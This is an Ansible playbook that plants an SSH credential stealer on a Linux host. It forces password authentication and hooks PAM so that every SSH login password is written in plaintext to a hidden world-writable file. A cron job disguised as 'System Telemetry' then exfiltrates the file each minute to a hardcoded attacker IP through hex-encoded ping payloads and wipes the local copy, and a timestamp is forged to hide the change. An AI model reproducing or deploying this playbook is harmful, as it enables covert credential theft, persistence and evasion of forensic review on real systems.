---
# ===============================================================
# CONFIGURATION: MANUAL ATTACKER IP
# ===============================================================
- name: Set Attacker IP and Paths
  set_fact:
    attacker_ip: "10.10.10.48"
    loot_dir: "/var/tmp/.system-cache"
    loot_file: ".ssh_loot.txt"

# --- STEP 1: DEPENDENCIES & DIRECTORIES ---
- name: Ensure xxd is installed (for hex encoding)
  become: yes
  package:
    name: xxd
    state: present

- name: Setup Hidden Loot Directory
  become: yes
  file:
    path: "{{ loot_dir }}"
    state: directory
    mode: '0777'

# --- STEP 2: REPAIR SSH & PAM CONFIGS ---
- name: Force SSHD to use Password Auth and PAM
  become: yes
  lineinfile:
    path: /etc/ssh/sshd_config
    regexp: "^#?{{ item.key }}"
    line: "{{ item.key }} {{ item.value }}"
  loop:
    - { key: "PasswordAuthentication", value: "yes" }
    - { key: "UsePAM", value: "yes" }
  register: ssh_config_change

- name: Restart SSH if config changed
  become: yes
  systemd:
    name: ssh
    state: restarted
  when: ssh_config_change.changed

- name: Inject Trap into SSH-Specific PAM File
  become: yes
  lineinfile:
    path: /etc/pam.d/sshd
    insertbefore: BOF
    line: "auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check"

# --- STEP 3: DEPLOY THE SCRIPTS ---
- name: Deploy NUL-Safe PAM Logger
  become: yes
  copy:
    dest: /usr/local/bin/ssh-auth-check
    mode: '0755'
    content: |
      #!/bin/bash
      read -d '' -r PASSWORD
      if [ -n "$PASSWORD" ]; then
          echo "$(date) | User: $PAM_USER | RHOST: $PAM_RHOST | Pass: $PASSWORD" >> {{ loot_dir }}/{{ loot_file }}
      fi

- name: Deploy ICMP (Ping) Beacon
  become: yes
  copy:
    dest: /usr/local/bin/sshbeacon
    mode: '0755'
    content: |
      #!/bin/bash
      ATTACKER_IP="{{ attacker_ip }}"
      LOOT="{{ loot_dir }}/{{ loot_file }}"

      if [ -s "$LOOT" ]; then
          # Convert loot to hex for the ping payload
          HEX_PAYLOAD=$(cat "$LOOT" | xxd -p | tr -d '\n' | cut -c1-32)
          ping -c 1 -p "$HEX_PAYLOAD" "$ATTACKER_IP" >/dev/null 2>&1
          
          # Wipe local evidence after "pinging" the data home
          > "$LOOT"
      fi

# --- STEP 4: PERSISTENCE & STEALTH ---
- name: Schedule Beacon (Every 1 Minute)
  become: yes
  cron:
    name: "System Telemetry"
    minute: "*"
    job: "/usr/local/bin/sshbeacon >/dev/null 2>&1"

- name: Anti-Forensics Timestamp Match
  become: yes
  shell: "touch -r /etc/pam.d/common-password /etc/pam.d/sshd"